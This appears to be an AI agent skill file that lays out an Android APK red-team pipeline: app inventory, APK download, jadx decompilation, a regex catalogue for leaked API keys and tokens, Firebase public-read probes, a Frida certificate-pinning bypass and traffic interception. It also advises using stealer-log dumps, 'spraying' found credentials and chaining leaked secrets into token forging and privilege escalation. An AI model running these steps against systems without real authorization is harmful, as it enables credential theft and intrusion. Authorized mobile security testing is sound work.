---
name: apk-redteam-pipeline
description: End-to-end Android APK red-team pipeline
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: authorized-engagement
report_count: 1
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## When to use this skill

Trigger when:
- Recon surfaces 1+ mobile apps under the target's developer name (Play Store dev page)
- A web app hosts `*.apk` files directly (e.g. `Recruitz.apk` found on a subdomain during one engagement)
- APK package IDs leaked via stealer logs (e.g. `com.<brand>.app`, `com.<brand>.<sub-brand>` patterns in stealer dump format)
- Customer-facing app, dealer/partner portal, or employee mobile companion app is in scope
- Bug bounty program lists Android in scope

DO NOT use for:
- iOS-only targets (different pipeline — IPA reverse, MobSF, frida-ios-dump)
- React Native / Flutter web apps already covered by JS bundle analysis
- Server-side only assessments

---

## Stage 0 — Inventory all org-owned apps

### Play Store developer-page scrape
```bash
# Find developer page from the target's brand name
curl -sk -A "Mozilla/5.0" "https://play.google.com/store/apps/developer?id=<Brand+Name>" -o /tmp/dev.html

# Extract package IDs
grep -oE 'id=[a-zA-Z0-9._]+' /tmp/dev.html | sort -u
```

Example output (anonymized — 7 packages typical for a multi-brand conglomerate):
```
com.events.<brand>build
com.<corp>.<sub-brand-1>
com.<corp>.<sub-brand-2>
com.<corp>.<flagship>
com.<corp>.<product-line-1>
com.<corp>.<product-line-2>
com.<corp>.<sub-brand-3>
```

### Cross-reference with stealer logs
Stealer-log format includes package names like `*@com.<corp>.<app>` — extract these from `creds_userpass.txt` if you have a leaked dump.

### Brand permutation guesses (multi-brand conglomerate patterns)
```
com.<brand>.app
com.<brand>.mobile  
com.<brand>.android
com.<brand>connect.app
in.<brand>.dealer
in.co.<brand>.app
```

---

## Stage 1 — APK acquisition

### Primary: APKPure direct (no auth required)
```bash
# Follow 302 redirects to actual download
curl -sk -L --max-time 60 \
  "https://d.apkpure.net/b/APK/<package_id>?version=latest" \
  -o "<package_id>.apk"

# Or via the legacy d-XX.winudf.com mirror chain (we saw this work)
```

### Secondary: APKMirror search
```bash
curl -sk -A "Mozilla/5.0" "https://www.apkmirror.com/?post_type=app_release&searchtype=apk&s=<brand>" \
  | grep -oE 'href="[^"]+\.apk[^"]*"' | sort -u
```

### Tertiary: APKPure web search
```bash
curl -sk "https://apkpure.com/search?q=<brand>" | grep -oE 'data-dt-app="[^"]+"'
```

### XAPK vs APK
- `.xapk` = a zip containing multiple split APKs (base + config.armeabi-v7a + config.en + etc.)
- Unzip outer first, then unzip the inner `base.apk` or `<package>.apk`
- Some apkpure downloads return truncated XAPK with missing EOCD signature — symptom of CDN rate-limiting; rotate IP and retry, OR use `7z x` which is more lenient than `unzip`

```bash
# Standard unzip (works for clean APK)
unzip -o <package>.apk -d extracted_<package>/

# For truncated/repaired XAPK
7z x -y <package>.apk -o"extracted_<package>"

# For nested XAPK
for inner in extracted_<package>/*.apk; do
  mkdir -p "extracted_<package>/$(basename "$inner" .apk)"
  unzip -o "$inner" -d "extracted_<package>/$(basename "$inner" .apk)"
done
```

---

## Stage 2 — DEX decompilation (jadx)

```bash
# Install
brew install jadx          # macOS
# or
wget https://github.com/skylot/jadx/releases/latest/download/jadx-1.5.x.zip

# Decompile
jadx -d decompiled_<package>/ <package>.apk

# For XAPK that contains multiple APKs
for inner in extracted_<package>/*.apk; do
  jadx -d decompiled_<package>_$(basename "$inner" .apk)/ "$inner"
done
```

For a fast "strings only" pass without full decompilation:
```bash
find extracted_<package> -name "classes*.dex" -exec strings -8 {} \; > strings_<package>.txt
```

---

## Stage 3 — Secret grep (the 60-pattern catalog)

```bash
# URL grep — owned-domain references
grep -oE 'https?://[a-zA-Z0-9.-]+\.(target1|target2|target3)\.(com|io|net|in)[a-zA-Z0-9./_?=&%-]*' strings_<package>.txt | sort -u

# Internal IP / port URLs
grep -oE 'https?://(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.)[0-9.]+(:[0-9]+)?[a-zA-Z0-9./_?=&-]*' strings_<package>.txt

# Cloud credentials
grep -oE 'AKIA[A-Z0-9]{16}'                            # AWS Access Key
grep -oE 'aws_secret_access_key[\s:=]+[A-Za-z0-9/+=]{40}' # AWS Secret
grep -oE 'AIza[A-Za-z0-9_-]{35}'                       # Google API key
grep -oE 'ya29\.[A-Za-z0-9_-]+'                        # Google OAuth refresh token
grep -oE 'gh[ps]_[A-Za-z0-9]{36}'                      # GitHub PAT
grep -oE 'glpat-[A-Za-z0-9_-]{20}'                     # GitLab PAT
grep -oE 'xox[pbar]-[A-Za-z0-9-]+'                     # Slack token
grep -oE 'sk-[A-Za-z0-9]{48}'                          # OpenAI API key
grep -oE 'sk-ant-[A-Za-z0-9_-]{90,}'                   # Anthropic API key
grep -oE 'AC[a-f0-9]{32}'                              # Twilio Account SID
grep -oE 'sk_live_[A-Za-z0-9]{24}'                     # Stripe live key
grep -oE 'pk_live_[A-Za-z0-9]{24}'                     # Stripe publishable
grep -oE 'mailgun-[A-Za-z0-9-]{40}'                    # Mailgun
grep -oE 'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}'    # SendGrid

# JWT (any algorithm)
grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' strings_<package>.txt

# Firebase
grep -oE '"(api_key|project_id|database_url|storage_bucket|client_id|mobilesdk_app_id|google_app_id|gcm_defaultSenderId)"\s*:\s*"[^"]+"' \
  extracted_<package>/res/values/strings.xml \
  extracted_<package>/google-services.json \
  decompiled_<package>/resources/AndroidManifest.xml 2>/dev/null

# OAuth client secrets
grep -oE 'client_secret["\s:=]+[A-Za-z0-9_-]{24,}' strings_<package>.txt

# Hardcoded passwords (heuristic — many false positives, manual review)
grep -oE '"password"\s*:\s*"[^"]+"|password\s*=\s*"[^"]+"' decompiled_<package>/sources/**/*.java 2>/dev/null
```

### Real-world example finding (anonymized — from an authorized engagement)
```
# Customer-facing APK shipped a hardcoded URL of this shape:
https://api.<client>.example/<path-token>/<resource-token>?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<sig>

# Decoded JWT payload: {"sid":<int>,"iat":<unix-ts>,"exp":<unix-ts>}
# Expired ~8 years earlier — but path tokens + 30 /v1/* endpoints still useful intel
```

---

## Stage 4 — Pinned certificate extraction

```bash
# Find .cer / .der / .pem files in assets/
find extracted_<package>/assets -iname "*.cer" -o -iname "*.der" -o -iname "*.pem" -o -iname "*.crt" 2>/dev/null

# Or in network_security_config.xml
find extracted_<package> -name "network_security_config.xml" -exec cat {} \;

# For each cert, extract subject + SAN (might reveal new internal API hosts)
for cert in $(find extracted_<package>/assets -iname "*.cer"); do
  echo "=== $cert ==="
  openssl x509 -in "$cert" -noout -subject -issuer -dates 2>/dev/null
  openssl x509 -in "$cert" -noout -text 2>/dev/null | grep -E 'Subject:|DNS:|Issuer:|Validity'
done
```

### Real-world example
A customer-facing APK from an authorized engagement contained `assets/api_<service>_<domain>_com.cer` — revealed the existence of an `api.<service>.<domain>.example` asset that had NOT surfaced in passive recon.

---

## Stage 5 — Exported component enumeration

AndroidManifest.xml lists components. Exported ones (especially with `android:exported="true"` or implicit-export via intent-filter) can be triggered by other apps — potential intent-injection attack surface.

```bash
# Decode binary AndroidManifest if needed
apktool d <package>.apk -o decoded_<package>/    # apktool decodes binary manifest

# Or read directly from jadx output
cat decompiled_<package>/resources/AndroidManifest.xml | grep -E '<(activity|service|receiver|provider)' | head -50

# Filter exported
grep -E 'android:exported="true"' decompiled_<package>/resources/AndroidManifest.xml
```

For each exported component, check:
- Does it accept extras that flow into a WebView (intent → WebView → XSS / file://)
- Does it accept URI extras (potential SSRF via deep link)
- Does it pass extras to other Activities (intent redirection)

---

## Stage 6 — Firebase / cloud-service config inspection

```bash
# google-services.json — full Firebase config
find extracted_<package> -name "google-services.json" -exec cat {} \; | python3 -m json.tool

# Look for:
#   project_id   → can guess Firestore / RTDB URL: https://<project_id>.firebaseio.com/.json
#   storage_bucket → can guess GCS bucket: gs://<bucket>
#   web_api_key  → can use to enumerate Firebase tenant config

# Test if Firestore is publicly readable
curl -s "https://firestore.googleapis.com/v1/projects/<project_id>/databases/(default)/documents/users"

# Test if Realtime DB is publicly readable
curl -s "https://<project_id>.firebaseio.com/.json"

# Test if Storage Bucket is publicly listable
curl -s "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
```

---

## Stage 7 — Runtime instrumentation (Frida)

For when static analysis isn't enough — you want to dump tokens at runtime, bypass cert pinning, or trace API calls.

### Setup
```bash
pip install --break-system-packages frida-tools objection
adb devices  # ensure device/emulator connected
# Push frida-server to device (root required, or use rooted emulator like Genymotion / x86_64 AVD)
```

### Cert-pinning bypass (universal)
```javascript
// frida-script-pinning-bypass.js
Java.perform(function() {
    // OkHttp
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
            console.log('[+] OkHttp pinning bypassed for: ' + arguments[0]);
            return;
        };
    } catch (e) {}
    // HttpsURLConnection
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function(chain) {
            console.log('[+] TrustManagerImpl verifyChain bypassed');
            return chain;
        };
    } catch (e) {}
});
```
```bash
frida -U -l frida-script-pinning-bypass.js -f <package_id> --no-pause
```

### Hook HTTP requests
```javascript
Java.perform(function() {
    var OkHttpClient = Java.use('okhttp3.OkHttpClient');
    var Request = Java.use('okhttp3.Request');
    var Call = Java.use('okhttp3.Call');
    
    OkHttpClient.newCall.implementation = function(req) {
        var url = req.url().toString();
        var headers = req.headers().toString();
        console.log('[REQ] ' + url);
        console.log('[HDRS] ' + headers);
        return this.newCall(req);
    };
});
```

### Quick token extraction via objection
```bash
objection --gadget com.target.app explore
# Inside:
android hooking watch class_method <class>.<method> --dump-args --dump-return
```

---

## Stage 8 — Network traffic capture (via mitmproxy)

For deeper API discovery once pinning is bypassed.

```bash
# Run mitmproxy on host
mitmproxy --listen-port 8080

# Configure Android device proxy to host:8080
# Install mitmproxy CA cert on device:
#   - Pull from http://mitm.it on the device, or
#   - Push to /system/etc/security/cacerts/ on rooted device

# Use the Frida pinning bypass script while traffic flows through mitmproxy
# All API calls visible in mitmproxy UI
```

---

## Decision tree — what to do with what you find

| Finding | Next move |
|---|---|
| Active JWT (not expired) | Test against the API host — does it grant access? Try sid manipulation |
| Expired JWT | Inspect path tokens / API endpoint structure — useful intel for post-VPN |
| AWS access key | Use `awscli` to test: `aws sts get-caller-identity` — many leaked keys still have permissions |
| Firebase project_id + web_api_key | Test public Firestore/RTDB/Storage read |
| Google API key (AIza*) | Test against `https://www.googleapis.com/customsearch/v1` etc. — see what API the key activates |
| Hardcoded HTTP URLs (http://) | Possible MITM via downgrade if cert pinning is missing |
| Pinned cert for internal host | New asset discovery — that host is real |
| Exported Activity with WebView | Test intent-injection → URL-loading abuse |
| Stack-trace artifacts (Stack Overflow URLs) | Identify the developer's questions → infer architecture |
| Hardcoded credentials | Spray immediately (respect any caps from related skills) |

---

## Anti-patterns

- **Don't grep only for "password"** — most secrets have specific high-signal patterns (AKIA, AIza, eyJ, etc.). Generic word grep produces too much noise.
- **Don't skip XAPK split APKs** — config.armeabi splits and config.<lang> splits sometimes contain different code paths.
- **Don't trust expired JWTs as "dead intel"** — the path structure, endpoint list, and signing algorithm are still useful. The 8-year-expired-JWT example above shows this.
- **Don't reverse only the latest version** — older APK versions (via APKMirror version history) sometimes have secrets removed in newer versions but still active server-side.
- **Don't ignore Firebase even if app looks "simple"** — Firebase rules misconfigurations (public read on Firestore) are extremely common.
- **Don't run Frida on a production device** — use rooted emulator or test device only.

---

## Tooling install (one-time)

```bash
brew install jadx p7zip
pip install --break-system-packages frida-tools objection
# Genymotion or AVD for rooted Android emulator
```

For APK download convenience, can add a `download-apk` shell function:
```bash
download-apk() {
  local pkg="$1"
  curl -sk -L --max-time 60 "https://d.apkpure.net/b/APK/$pkg?version=latest" -o "$pkg.apk"
  echo "Downloaded $(wc -c < "$pkg.apk") bytes"
  file "$pkg.apk"
}
```

---

## Bridge to neighboring skills

- `offensive-osint` — Play Store / APKMirror enum is part of broader OSINT
- `hunt-cloud-misconfig` — Firebase public-read is exactly this skill's specialty post-discovery
- `hunt-api-misconfig` — JWT manipulation once you have the algorithm + sample token
- `evidence-hygiene` — extracted secrets need redaction before report inclusion
- `redteam-mindset` — APK reverse on day-1 of an engagement, not as an afterthought

---

## Real-world finding template (anonymized — authorized engagement)

**Finding: Hardcoded JWT + 30+ Internal API Endpoints in a customer-facing APK**

- Subject: Hardcoded artifacts in legacy mobile build reveal internal API surface
- Observations: Decompilation of `com.<client>.<app>` revealed embedded JWT (expired ~8 years earlier) and 30+ `/v1/*` endpoint paths against `api2.<client>.example` (internal-only externally)
- Description: APK ships with developer build artifacts. Path tokens are security-by-obscurity; API endpoint inventory is reconnaissance-grade.
- Impact: Post-VPN-foothold (via cred compromise), attacker has full API surface map without binary reverse. HS256 secret recovery (via SSRF/LFI) would yield arbitrary token forging.
- Recommendation: rotate HS256 secret, migrate to RS256, remove hardcoded URLs from builds, audit all org APKs.
- Evidence: extracted strings, decoded JWT, endpoint inventory

---

## Related Skills & Chains

- **`cloud-iam-deep`** — APK secret extraction frequently yields live AWS/GCP/Azure credentials. Chain primitive: jadx string-grep produces AWS Access Key ID + Secret → `cloud-iam-deep` `aws sts get-caller-identity` → role/policy enumeration → IAM privilege-escalation path (one of 24 documented AWS escalation patterns) → cloud-plane takeover. Same flow applies to GCP service-account JSON and Azure shared-access-signature tokens extracted from APK resources.
- **`hunt-api-misconfig`** — APK endpoint inventory hands you the API surface for free; mass-assignment, JWT, and CORS bugs are typical. Chain primitive: APK reveals `/v1/users/me` and `/v1/admin/users` → `hunt-api-misconfig` mass-assignment probes (`{is_admin:true}`) against `/v1/users/me` → admin role escalation → access to `/v1/admin/users`.
- **`hunt-rce`** — Hardcoded JWT signing secrets (HS256) extracted from APK enable arbitrary token forging. Chain primitive: APK strings yield HS256 secret → forge admin token → access admin API → if API has eval/template/sink → `hunt-rce` to server. Also: exported components with intent-injection sinks can reach `Runtime.exec` if app is local-installed.
- **`offensive-osint`** — APK is one node in the broader org recon graph; pair with breach corpora and cert transparency. Chain primitive: APK reveals internal API hostname `api2.example.com` → `offensive-osint` certificate-transparency lookup → discover sibling subdomains → expanded attack surface.
- **`redteam-report-template`** — APK findings need clear "what the binary leaks" framing because client engineers often dismiss mobile-static findings as "obfuscation problem." Chain primitive: validated finding (token/URL/secret extracted) → `triage-validation` 7-Question Gate (specifically: "does this credential still authenticate today?") → `redteam-report-template` packaging with explicit binary version + extraction reproduction steps.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
